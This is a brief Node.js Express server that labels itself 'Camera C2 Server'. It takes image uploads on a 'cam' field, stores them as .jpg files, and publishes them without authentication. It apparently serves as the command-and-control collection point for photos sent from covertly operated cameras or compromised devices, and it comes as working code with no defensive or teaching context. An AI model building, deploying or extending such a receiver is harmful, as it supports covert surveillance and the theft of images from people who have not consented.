const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// Create uploads folder
const uploadDir = './uploads';
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir, { recursive: true });

const storage = multer.diskStorage({
  destination: uploadDir,
  filename: (req, file, cb) => cb(null, Date.now() + '_' + file.fieldname + '.jpg')
});
const upload = multer({ storage });

app.use(express.static(uploadDir));  // Serve photos publicly

app.post('/upload', upload.single('cam'), (req, res) => {
  if (req.file) {
    console.log('✅ PHOTO RECEIVED:', req.file.filename);
    res.json({ status: 'ok', file: req.file.filename });
  } else {
    console.log('❌ No file received');
    res.status(400).json({ error: 'No file' });
  }
});

app.get('/', (req, res) => res.send('🖼️ Camera C2 Server OK'));

app.listen(PORT, () => console.log(`Server on port ${PORT}`));
